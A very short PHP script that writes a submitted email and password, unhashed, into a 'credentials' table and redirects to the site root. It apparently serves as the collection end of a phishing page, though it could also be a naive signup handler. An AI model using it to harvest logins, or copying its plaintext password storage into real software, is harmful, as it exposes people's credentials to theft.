<?php
    $settings = require_once 'settings-local.php';
    require_once 'db.php';
    db_insert('credentials', array('email' => $_POST['email'], 'pass' => $_POST['pass']));

    header('Location: /');
?>
